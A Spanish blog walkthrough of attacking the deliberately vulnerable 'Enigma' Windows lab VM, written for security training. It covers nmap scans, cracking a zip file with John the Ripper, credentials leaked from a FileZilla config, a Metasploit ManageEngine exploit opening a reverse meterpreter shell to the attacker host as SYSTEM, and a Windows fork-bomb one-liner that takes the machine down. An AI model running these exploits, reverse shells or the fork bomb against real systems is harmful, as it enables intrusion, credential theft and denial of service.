---
title: MTD - Enigma 
published: true
categories: [Windows]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Fácil]
---

<img src="/assets/HTB/Enigma/enigma.png">

¡Hola!
Vamos a hacer un análisis de las vulnerabilidades más críticas en  `Enigma` de dificultad "Fácil".
`Enigma` es una máquina virtual Windows Server 2012 intencionadamente vulnerable. Esta máquina virtual puede utilizarse para impartir formación en seguridad, probar herramientas de seguridad y practicar técnicas habituales de pruebas de penetración. 

### Técnicas Vistas: 

- **WPScan**
- **FTP**
- **Manage Engine Desktop**
- **SMBCLIENT**
- **METERPRETER**
- **ATAQUES Dos**

# Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre ``. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

# Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.0.2.4
PING 10.0.2.4 (10.0.2.4) 56(84) bytes of data.
64 bytes from 10.0.2.4: icmp_seq=1 ttl=128 time=0.593 ms

--- 10.0.2.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.593/0.593/0.593/0.000 ms

```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 128.

* `TTL => 64 Linux`
* `TTL => 128 Windows`

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.0.2.4 -oG allPorts
```

```bash
☁  nmap  cat allports -l java
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allports
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.93 scan initiated Wed Feb  1 18:23:21 2023 as: nmap -p- --open --min-rate 5000 -sS -sV -Pn -vvv -oG allports 10.0.2.4
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.0.2.4 ()   Status: Up
   4   │ Host: 10.0.2.4 ()   Ports: 21/open/tcp//ftp//FileZilla ftpd/, 53/open/tcp//domain//Simple DNS Plus/, 88/open/tcp//kerberos-sec//Microsoft Windows Kerberos (server time: 2023-02-01 17:23:40Z)/, 135/open/tcp//msrpc//Microsoft Windo
       │ ws RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 389/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: SantaPrisca.virtual, Site: Default-First-Site-Name)/, 445/open/tcp//microsoft-ds//Microsoft 
       │ Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: SANTAPRISCA)/, 464/open/tcp//kpasswd5?///, 593/open/tcp//ncacn_http//Microsoft Windows RPC over HTTP 1.0/, 636/open/tcp//tcpwrapped///, 1801/open/tcp//msmq?///, 2103/open/tcp
       │ //msrpc//Microsoft Windows RPC/, 2105/open/tcp//msrpc//Microsoft Windows RPC/, 2107/open/tcp//msrpc//Microsoft Windows RPC/, 3268/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: SantaPrisca.virtual, Site: Default
       │ -First-Site-Name)/, 3269/open/tcp//tcpwrapped///, 3306/open/tcp//mysql//MySQL (unauthorized)/, 3389/open/tcp//ssl|ms-wbt-server?///, 3700/open/tcp//giop//CORBA naming service/, 4848/open/tcp//ssl|http//Oracle GlassFish 4.0 (Servl
       │ et 3.1; JSP 2.3; Java 1.8)/, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 7676/open/tcp//java-message-service//Java Message Service 301/, 8009/open/tcp//ajp13//Apache Jserv (Protocol v1.3)/, 8019/open/tcp//qbdb?
       │ ///, 8020/open/tcp//http//Apache httpd/, 8022/open/tcp//http//Apache Tomcat|Coyote JSP engine 1.1/, 8027/open/tcp//papachi-p2p-srv?///, 8028/open/tcp//postgresql//PostgreSQL DB/, 8031/open/tcp//ssl|unknown///, 8032/open/tcp//desk
       │ top-central//ManageEngine Desktop Central DesktopCentralServer/, 8080/open/tcp//http//Sun GlassFish Open Source Edition  4.0/, 8181/open/tcp//ssl|intermapper?///, 8282/open/tcp//http//Apache Tomcat|Coyote JSP engine 1.1/, 8383/op
       │ en/tcp//http//Apache httpd/, 8443/open/tcp//ssl|https-alt?///, 8444/open/tcp//desktop-central//ManageEngine Desktop Central DesktopCentralServer/, 8484/open/tcp//http//Jetty winstone-2.8/, 8585/open/tcp//http//Apache httpd 2.2.21
       │  ((Win64) PHP|5.3.10 DAV|2)/, 8686/open/tcp//java-rmi//Java RMI/, 9200/open/tcp//wap-wsp?///, 9300/open/tcp//vrace?///, 9389/open/tcp//mc-nmf//.NET Message Framing/, 47001/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/,
       │  49152/open/tcp//msrpc//Microsoft Windows RPC/, 49153/open/tcp//msrpc//Microsoft Windows RPC/, 49154/open/tcp//msrpc//Microsoft Windows RPC/, 49155/open/tcp//msrpc//Microsoft Windows RPC/, 49157/open/tcp//ncacn_http//Microsoft Wi
       │ ndows RPC over HTTP 1.0/, 49158/open/tcp//msrpc//Microsoft Windows RPC/, 49163/open/tcp//msrpc//Microsoft Windows RPC/, 49164/open/tcp//msrpc//Microsoft Windows RPC/, 49167/open/tcp//unknown///, 49240/open/tcp//msrpc//Microsoft W
       │ indows RPC/, 49312/open/tcp//ssh//Apache Mina sshd 0.8.0 (protocol 2.0)/, 49313/open/tcp//jenkins-listener//Jenkins TcpSlaveAgentListener/, 49336/open/tcp//msrpc//Microsoft Windows RPC/, 49337/open/tcp//msrpc//Microsoft Windows R
       │ PC/
   5   │ # Nmap done at Wed Feb  1 18:26:49 2023 -- 1 IP address (1 host up) scanned in 208.25 seconds


```

Con nuestra herramienta `extractPorts` previamente definida en nuestra `.zshrc` podremos extraer los puertos más relevantes y hacerle un escaneo a dichos puertos, para ver el servicio usado en ellos.

```bash [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.0.2.4
   5   │     [*] Open ports: 21,53,88,135,139,389,445,464,593,636,1801,2103,2105,2107,3268,3269,3306,3389,3700,4848,5985,7676,8009,8019,8020,8022,8027,8028,8031,8032,8080,8181,8282,8383,8443,8444,8484,8585,8686,9200,9300,9389,47001,49152,49153,49154,49155,49157,49158,4916
       │ 3,49164,49167,49240,49312,49313,49336,49337
   6   │ 
   7   │ [*] Ports copied to clipboard
```


Usaremos de nuevo un siguiente escaneo sobre los puertos hallados para ver el servicio y versión sobre los que se están ejecutando, y lo guardaremos en un archivo llamado targeted.

```bash
cat targeted -l java 
File: targeted
───────┼────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.93 scan initiated Wed Feb  1 18:36:27 2023 as: nmap -sC -sV -p
       │ 21,53,88,135,139,389,445,464,593,636,1801,2103,2105,2107,3268,3269,3306
       │ ,3389,3700,4848,5985,7676,8009,8019,8020,8022,8027,8028,8031,8032,8080,
       │ 8181,8282,8383,8443,8444,8484,8585,8686,9200,9300,9389,47001,49152,4915
       │ 3,49154,49155,49157,49158,49163,49164,49167,49240,49312,49313,49336,493
       │ 37 -oN targeted 10.0.2.4
   2   │ Nmap scan report for 10.0.2.4
   3   │ Host is up (0.00079s latency).
   4   │ 
   5   │ PORT      STATE SERVICE              VERSION
   6   │ 21/tcp    open  ftp                  FileZilla ftpd
   7   │ | ftp-syst: 
   8   │ |_  SYST: UNIX emulated by FileZilla
   9   │ 53/tcp    open  domain               Simple DNS Plus
  10   │ 88/tcp    open  kerberos-sec         Microsoft Windows Kerberos (server
       │  time: 2023-02-01 17:36:36Z)
  11   │ 135/tcp   open  msrpc                Microsoft Windows RPC
  12   │ 139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
  13   │ 389/tcp   open  ldap                 Microsoft Windows Active Directory
       │  LDAP (Domain: SantaPrisca.virtual, Site: Default-First-Site-Name)
  14   │ 445/tcp   open  microsoft-ds         Windows Server 2012 Standard 9200 
       │ microsoft-ds (workgroup: SANTAPRISCA)
  15   │ 464/tcp   open  kpasswd5?
  16   │ 593/tcp   open  ncacn_http           Microsoft Windows RPC over HTTP 1.
       │ 0
  17   │ 636/tcp   open  tcpwrapped
  18   │ 1801/tcp  open  msmq?
  19   │ 2103/tcp  open  msrpc                Microsoft Windows RPC
  20   │ 2105/tcp  open  msrpc                Microsoft Windows RPC
  21   │ 2107/tcp  open  msrpc                Microsoft Windows RPC
  22   │ 3268/tcp  open  ldap                 Microsoft Windows Active Directory
       │  LDAP (Domain: SantaPrisca.virtual, Site: Default-First-Site-Name)
  23   │ 3269/tcp  open  tcpwrapped
  24   │ 3306/tcp  open  mysql                MySQL (unauthorized)
  25   │ 3389/tcp  open  ssl/ms-wbt-server?
  26   │ |_ssl-date: 2023-02-01T17:40:08+00:00; +1s from scanner time.
  27   │ | ssl-cert: Subject: commonName=enigma.SantaPrisca.virtual
  28   │ | Not valid before: 2023-01-24T19:09:36
  29   │ |_Not valid after:  2023-07-26T19:09:36
  30   │ | rdp-ntlm-info: 
  31   │ |   Target_Name: SANTAPRISCA
  32   │ |   NetBIOS_Domain_Name: SANTAPRISCA
  33   │ |   NetBIOS_Computer_Name: ENIGMA
  34   │ |   DNS_Domain_Name: SantaPrisca.virtual
  35   │ |   DNS_Computer_Name: enigma.SantaPrisca.virtual
  36   │ |   DNS_Tree_Name: SantaPrisca.virtual
  37   │ |   Product_Version: 6.2.9200
  38   │ |_  System_Time: 2023-02-01T17:39:36+00:00
  39   │ 3700/tcp  open  giop                 CORBA naming service
  40   │ |_giop-info: ERROR: Script execution failed (use -d to debug)
  41   │ 4848/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
  42   │ |_http-trane-info: Problem with XML parsing of /evox/about
  43   │ |_http-server-header: GlassFish Server Open Source Edition  4.0 
  44   │ |_ssl-date: 2023-02-01T17:40:08+00:00; +1s from scanner time.
  45   │ | ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/  stateOrProvinceName=California/countryName=US
  46   │ | Not valid before: 2013-05-15T05:33:38
  47   │ |_Not valid after:  2023-05-13T05:33:38
  48   │ |_http-title: Did not follow redirect to https://10.0.2.4:4848/
  49   │ 5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  50   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  51   │ |_http-title: Not Found
  52   │ 7676/tcp  open  java-message-service Java Message Service 301
  53   │ 8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
  54   │ |_ajp-methods: Failed to get a valid response for the OPTION request
  55   │ 8019/tcp  open  qbdb?
  56   │ 8020/tcp  open  http                 Apache httpd
  57   │ |_http-server-header: Apache
  58   │ |_http-title: Site doesn't have a title (text/html;charset=UTF-8).
  59   │ | http-methods: 
  60   │ |_  Potentially risky methods: PUT DELETE
  61   │ 8022/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
  62   │ |_http-server-header: Apache-Coyote/1.1
  63   │ |_http-title: Site doesn't have a title (text/html;charset=UTF-8).
  64   │ | http-methods: 
  65   │ |_  Potentially risky methods: PUT DELETE
  66   │ 8027/tcp  open  papachi-p2p-srv?
  67   │ 8028/tcp  open  postgresql           PostgreSQL DB
  68   │ 8031/tcp  open  ssl/unknown
  69   │ 8032/tcp  open  desktop-central      ManageEngine Desktop Central DesktopCentralServer
  70   │ 8080/tcp  open  http                 Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
  71   │ |_http-server-header: GlassFish Server Open Source Edition  4.0 
  72   │ | http-methods: 
  73   │ |_  Potentially risky methods: PUT DELETE TRACE
  74   │ |_http-open-proxy: Proxy might be redirecting requests
  75   │ |_http-title: GlassFish Server - Server Running
  76   │ 8181/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
  77   │ |_http-server-header: GlassFish Server Open Source Edition  4.0 
  78   │ | ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
  79   │ | Not valid before: 2013-05-15T05:33:38
  80   │ |_Not valid after:  2023-05-13T05:33:38
  81   │ |_ssl-date: 2023-02-01T17:40:08+00:00; +1s from scanner time.
  82   │ |_http-title: GlassFish Server - Server Running
  83   │ | http-methods: 
  84   │ |_  Potentially risky methods: PUT DELETE TRACE
  85   │ 8282/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
  86   │ |_http-server-header: Apache-Coyote/1.1
  87   │ |_http-favicon: Apache Tomcat
  88   │ |_http-title: Apache Tomcat/8.0.33
  89   │ 8383/tcp  open  http                 Apache httpd
  90   │ | http-methods: 
  91   │ |_  Potentially risky methods: PUT DELETE
  92   │ |_http-server-header: Apache
  93   │ |_http-title: 400 Bad Request
  94   │ 8443/tcp  open  ssl/https-alt?
  95   │ 8444/tcp  open  desktop-central      ManageEngine Desktop Central DesktopCentralServer
  96   │ 8484/tcp  open  http                 Jetty winstone-2.8
  97   │ |_http-server-header: Jetty(winstone-2.8)
  98   │ |_http-title: Dashboard [Jenkins]
  99   │ | http-robots.txt: 1 disallowed entry 
 100   │ |_/
 101   │ 8585/tcp  open  http                 Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
 102   │ |_http-server-header: Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2
 103   │ | http-methods: 
 104   │ |_  Potentially risky methods: TRACE
 105   │ |_http-title: La guarida del enigma
 106   │ 8686/tcp  open  java-rmi             Java RMI
 107   │ | rmi-dumpregistry: 
 108   │ |   enigma.SantaPrisca.virtual/7676/jmxrmi
 109   │ |     javax.management.remote.rmi.RMIServerImpl_Stub
 110   │ |     @10.0.2.4:49357
 111   │ |     extends
 112   │ |       java.rmi.server.RemoteStub
 113   │ |       extends
 114   │ |         java.rmi.server.RemoteObject
 115   │ |   jmxrmi
 116   │ |     javax.management.remote.rmi.RMIServerImpl_Stub
 117   │ |     @10.0.2.4:8686
 118   │ |     extends
 119   │ |       java.rmi.server.RemoteStub
 120   │ |       extends
 121   │ |_        java.rmi.server.RemoteObject
 122   │ 9200/tcp  open  wap-wsp?
 123   │ | fingerprint-strings: 
 124   │ |   FourOhFourRequest: 
 125   │ |     HTTP/1.0 400 Bad Request
 126   │ |     Content-Type: text/plain; charset=UTF-8
 127   │ |     Content-Length: 80
 128   │ |     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
 129   │ |   GetRequest: 
 130   │ |     HTTP/1.0 200 OK
 131   │ |     Content-Type: application/json; charset=UTF-8
 132   │ |     Content-Length: 314
 133   │ |     "status" : 200,
 134   │ |     "name" : "Douglas Birely",
 135   │ |     "version" : {
 136   │ |     "number" : "1.1.1",
 137   │ |     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
 138   │ |     "build_timestamp" : "2014-04-16T14:27:12Z",
 139   │ |     "build_snapshot" : false,
 140   │ |     "lucene_version" : "4.7"
 141   │ |     "tagline" : "You Know, for Search"
 142   │ |   HTTPOptions: 
 143   │ |     HTTP/1.0 200 OK
 144   │ |     Content-Type: text/plain; charset=UTF-8
 145   │ |     Content-Length: 0
 146   │ |   RTSPRequest, SIPOptions: 
 147   │ |     HTTP/1.1 200 OK
 148   │ |     Content-Type: text/plain; charset=UTF-8
 149   │ |_    Content-Length: 0
 150   │ 9300/tcp  open  vrace?
 151   │ 9389/tcp  open  mc-nmf               .NET Message Framing
 152   │ 47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 153   │ |_http-server-header: Microsoft-HTTPAPI/2.0
 154   │ |_http-title: Not Found
 155   │ 49152/tcp open  msrpc                Microsoft Windows RPC
```


* * *
# Exploits 


#### NETBIOS
Analizamos los `puertos 398 y 3398` donde nos da bastante información sobre la máquina que estamos trabajando.

```bash
LDAP (Domain: SantaPrisca.virtual, Site: Default-First-Site-Name) 
Target_Name: SANTAPRISCA
  32   │ |   NetBIOS_Domain_Name: SANTAPRISCA
  33   │ |   NetBIOS_Computer_Name: ENIGMA
  34   │ |   DNS_Domain_Name: SantaPrisca.virtual
  35   │ |   DNS_Computer_Name: enigma.SantaPrisca.virtual
  36   │ |   DNS_Tree_Name: SantaPrisca.virtual
  37   │ |   Product_Version: 6.2.9200
```


##### WPSCAN
Con nuestra herramienta de WPSCAN hemos podido conseguir varias credenciales:
`user: solomon` `pass: 12345678`

### FTP
Analizamos el puerto 21 y con las credenciales halladas con `WPScan` podemos observar un archivo:

```bash
☁  nmap  ftp 10.0.2.4
Connected to 10.0.2.4.
220-Enigmazilla
220 Cualquier intruso que intente entrar sin permiso lo pagara muy caro!
Name (10.0.2.4:plugg): solomon
331 Password required for solomon
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5505|)
150 Opening data channel for directory listing of "/"
-rw-r--r-- 1 ftp ftp            976 Mar 08  2019 rompeme.zip
226 Successfully transferred "/"
ftp> 
```

Nos bajaremos dicho archivo con el comando `get rompeme.zip` y usaremos `John The Ripper` para romper la contraseña de dicho archivo.

```bash
☁  nmap  john rompeme    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
0g 0:00:00:28  3/3 0g/s 9734Kp/s 9734Kc/s 9734KC/s dg0t1d..dgbij2
0g 0:00:00:31  3/3 0g/s 9987Kp/s 9987Kc/s 9987KC/s fm1opm..fmk3is
0g 0:00:00:32  3/3 0g/s 10051Kp/s 10051Kc/s 10051KC/s allejo1..alb4du1
0g 0:00:00:35  3/3 0g/s 10263Kp/s 10263Kc/s 10263KC/s tabtua4..takwans
0g 0:00:00:36  3/3 0g/s 10321Kp/s 10321Kc/s 10321KC/s ic6ln5..itah31
0g 0:00:00:37  3/3 0g/s 10376Kp/s 10376Kc/s 10376KC/s gwydr1a..gwy253a
simpleplan       (rompeme.zip)   
```

```bash
☁ enigma  cd rompeme
☁  rompeme  ll
total 8,0K
-rw-r--r-- 1 plugg plugg 614 mar  8  2019 IRC.log
-rw-r--r-- 1 plugg plugg 555 mar  8  2019 recentservers.xml
```

```bash 
☁  rompeme  cat recentservers.xml -l xml
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: recentservers.xml
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="UTF-8"?>
   2   │ <FileZilla3 version="3.35.2" platform="windows">
   3   │     <RecentServers>
   4   │         <Server>
   5   │             <Host>SantaPrisca.virtual</Host>
   6   │             <Port>21</Port>
   7   │             <Protocol>0</Protocol>
   8   │             <Type>0</Type>
   9   │             <User>perdicion</User>
  10   │             <Password>KingSnake</Password>
  11   │             <Logontype>2</Logontype>
  12   │             <TimezoneOffset>0</TimezoneOffset>
  13   │             <PasvMode>MODE_DEFAULT</PasvMode>
  14   │             <MaximumMultipleConnections>0</MaximumMultipleConnections>
  15   │             <EncodingType>Auto</EncodingType>
  16   │             <BypassProxy>0</BypassProxy>
  17   │         </Server>
  18   │     </RecentServers>
  19   │ </FileZilla3>

```
Podemos encontrar un usuario y una contraseña útiles `User: perdicion` `Password: KingSnake`



### Manage Desktop Central
En nuestra fase de reconocimiento podremos ver que tenemos una vulnerabilidad llamada "ManageEngine" para ello haremos uso de `metasploit-framework`.

```msf6 exploit(windows/http/manageengine_connectionid_write) > options

Module options (exploit/windows/http/manageengine_connectionid_write):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8020             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path for ManageEngine Desktop Central
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ManageEngine Desktop Central 9 on Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_connectionid_write) > set payload windows/
Display all 213 possibilities? (y or n)
msf6 exploit(windows/http/manageengine_connectionid_write) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/manageengine_connectionid_write) > set rhost 10.0.2.4
rhost => 10.0.2.4
msf6 exploit(windows/http/manageengine_connectionid_write) > options

Module options (exploit/windows/http/manageengine_connectionid_write):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8020             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path for ManageEngine Desktop Central
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ManageEngine Desktop Central 9 on Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_connectionid_write) > set exitfunc thread
exitfunc => thread
msf6 exploit(windows/http/manageengine_connectionid_write) > exploit

[*] Started reverse TCP handler on 10.0.2.5:4444 
[*] Creating JSP stager
[*] Uploading JSP stager zrlov.jsp...
[*] Executing stager...
[*] Sending stage (200774 bytes) to 10.0.2.4
[+] Deleted ../webapps/DesktopCentral/jspf/zrlov.jsp
[*] Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.4:63918) at 2023-02-01 20:29:24 +0100

meterpreter > getsystem
[-] Already running as SYSTEM
```

* * *

#### ATAQUE DOS
Una vez dentro del servicio y estando como SYSTEM, tendriamos la escala de privilegios realizada pero podremos realizar ataques DOS hacia la misma máquina haciendo un poco de `scripting`.
Usaremos el `auxiliary(dos/http/slowris)`

```bash
msf6 > search slowris
```

```bash
msf6 exploit(windows/http/manageengine_connectionid_write) > options
```

Setearemos todas las opciones para poder usar el exploit con el payload `windows/x64/windows/meterpreter/reverse_tcp`
Una vez creada la sesión podremos crearnos una `shell`para ejecutar comando directamente desde la consola del servidor Windows.

```bash
meterpreter > shell
Process 4088 created.
Channel 2 created.
Microsoft Windows [Version 6.2.9200]
(c) 2012 Microsoft Corporation. All rights reserved.

C:\ManageEngine\DesktopCentral_Server\bin>
```

Una vez dentro podremos hacer una `bomb fork` con una línea de comandos simple 
`for /l %a in (0, 0, 0) do start`

```bash 
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 4472 created.
Channel 3 created.
Microsoft Windows [Version 6.2.9200]
(c) 2012 Microsoft Corporation. All rights reserved.

C:\ManageEngine\DesktopCentral_Server\bin>echo "for /l %a in (0, 0, 0) do start"
echo "for /l %a in (0, 0, 0) do start"
"for /l %a in (0, 0, 0) do start"

C:\ManageEngine\DesktopCentral_Server\bin>for /l %a in (0, 0, 0) do start 
for /l %a in (0, 0, 0) do start

C:\ManageEngine\DesktopCentral_Server\bin>start
C:\ManageEngine\DesktopCentral_Server\bin>start
C:\ManageEngine\DesktopCentral_Server\bin>start
C:\ManageEngine\DesktopCentral_Server\bin>start
```
Podremos entrar dentro de la máquina para poder ver lo ocurrido en ella:

<img src="/assets/HTB/Enigma/dos.png">

Y observad que la máquina ha quedado inoperativa por completo.


* * *




